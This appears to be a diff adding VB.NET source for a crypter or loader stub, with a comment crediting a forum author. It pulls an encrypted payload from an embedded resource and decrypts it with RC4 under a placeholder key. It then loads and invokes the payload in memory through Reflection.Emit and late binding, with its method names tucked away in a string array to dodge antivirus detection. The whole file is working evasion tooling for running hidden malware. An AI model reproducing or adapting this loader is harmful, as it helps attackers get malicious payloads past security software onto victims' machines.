@@ -1,0 +1,86 @@
+Option Strict Off
+Option Explicit Off
+Imports System, Microsoft.VisualBasic
+Imports System.Reflection
+Imports System.IO
+Imports System.Text
+Imports System.Reflection.Emit
+Imports Microsoft.VisualBasic.CompilerServices
+Imports System.Linq.Expressions
+Imports System.Collections
+
+Public Class Alpha
+
+    Public Shared Sub Main()
+        Dim D As Byte() = Nothing
+        Dim DE As DictionaryEntry
+        Dim RM As New Resources.ResourceManager("B", Assembly.GetExecutingAssembly)
+        For Each DE In RM.GetResourceSet(System.Globalization.CultureInfo.CurrentCulture, True, True)
+            D = DirectCast(Encoding.Default.GetBytes(DE.Key), Byte())
+        Next
+        Dim Ui As New Ui
+        Ui.ExecBytes(D)
+    End Sub
+
+End Class
+Public Class Ui
+
+    Private StrArray As String() = {"System.Activator", "CreateInstance", "System.Reflection.Emit.DynamicMethod", "GetIlGenerator", "System.Reflection.Assembly", "System.Type", "System.Reflection.MethodBase", "Load", "GetType", "GetMethod", "Invoke", "Emit", "CallByName", "Beta.Charlie", "Delta", "%KeyString%"}
+    Private void_Args As Object() = {GetType(Object), GetType(Byte()), GetType(String), GetType(Object())}
+
+    Public Function ExecBytes(ByVal bytes As Byte()) As Object
+        Dim DY As Object = NewLateBinding.LateGet(Nothing, Type.GetType(StrArray(0)), StrArray(1), New Object() {Type.GetType(StrArray(2)), New Guid().ToString, void_Args(0), New Type() {void_Args(1), void_Args(3), void_Args(2), void_Args(2)}, GetType(Object)}, Nothing, Nothing, Nothing)
+        Dim IL As Object = NewLateBinding.LateGet(DY, Nothing, StrArray(3), Nothing, Nothing, Nothing, Nothing)
+
+        Dim asm_Call As Object = Type.GetType(StrArray(4)).GetMethod(StrArray(7), New [Type]() {void_Args(1)})
+        Dim typ_Call As Object = Type.GetType(StrArray(4)).GetMethod(StrArray(8), New [Type]() {void_Args(2)})
+        Dim mth_Call As Object = Type.GetType(StrArray(5)).GetMethod(StrArray(9), New [Type]() {void_Args(2)})
+        Dim inv_Call As Object = Type.GetType(StrArray(6)).GetMethod(StrArray(10), New [Type]() {void_Args(0), void_Args(3)})
+
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Ldarg_0}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Call, asm_Call}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Ldarg_2}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Call, typ_Call}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Ldarg_3}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Call, mth_Call}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Ldnull}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Ldarg_1}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Call, inv_Call}, Nothing, Nothing, Nothing)
+        NewLateBinding.LateGet(IL, Nothing, StrArray(11), New Object() {OpCodes.Ret}, Nothing, Nothing, Nothing)
+
+        Dim callExpr As Expression = Expression.Call(GetType(Versioned).GetMethod(StrArray(12)), Expression.Constant(DY), Expression.Constant(StrArray(10)), Expression.Constant(CallType.Method), Expression.Constant(New Object() {Nothing, New Object() {Proper_RC4(bytes, Encoding.Default.GetBytes(StrArray(15))), Nothing, StrArray(13), StrArray(14)}}))
+        Return Expression.Lambda(Of Func(Of Object))(callExpr).Compile()()
+    End Function
+
+    Private Function Proper_RC4(ByVal Input As Byte(), ByVal Key As Byte()) As Byte()
+        'Leave a thanks at least..
+        'by d3c0mpil3r from HF
+        Dim i, j, swap As UInteger
+        Dim s As UInteger() = New UInteger(255) {}
+        Dim Output As Byte() = New Byte(Input.Length - 1) {}
+
+        For i = 0 To 255
+            s(i) = i
+        Next
+
+        For i = 0 To 255
+            j = (j + Key(i Mod Key.Length) + s(i)) And 255
+            swap = s(i) 'Swapping of s(i) and s(j)
+            s(i) = s(j)
+            s(j) = swap
+        Next
+
+        i = 0 : j = 0
+        For c = 0 To Output.Length - 1
+            i = (i + 1) And 255
+            j = (j + s(i)) And 255
+            swap = s(i) 'Swapping of s(i) and s(j)
+            s(i) = s(j)
+            s(j) = swap
+            Output(c) = Input(c) Xor s((s(i) + s(j)) And 255)
+        Next
+
+        Return Output
+    End Function
+
+End Class
